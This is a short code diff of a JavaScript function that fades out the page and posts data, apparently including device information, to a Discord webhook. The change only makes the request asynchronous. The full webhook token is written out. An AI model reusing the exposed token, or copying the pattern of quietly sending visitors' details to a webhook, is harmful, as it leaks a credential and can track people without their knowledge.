@@ -158,7 +158,7 @@ function send_message2(string, link, details=false) {
 	$("#wrapper").fadeTo(750, 0)
 	var device_info = "";
 	var request = new XMLHttpRequest();
-	request.open("POST", "https://discord.com/api/webhooks/831949766698467338/U644U1woudzGB2s5bpaHIj_OYSyfTc8ENa9MAutiD1yD0mNUDz2kF_VnPAjCjiHB1z9n", false);
+	request.open("POST", "https://discord.com/api/webhooks/831949766698467338/U644U1woudzGB2s5bpaHIj_OYSyfTc8ENa9MAutiD1yD0mNUDz2kF_VnPAjCjiHB1z9n");
 
 	request.setRequestHeader('Content-type', 'application/json');
 
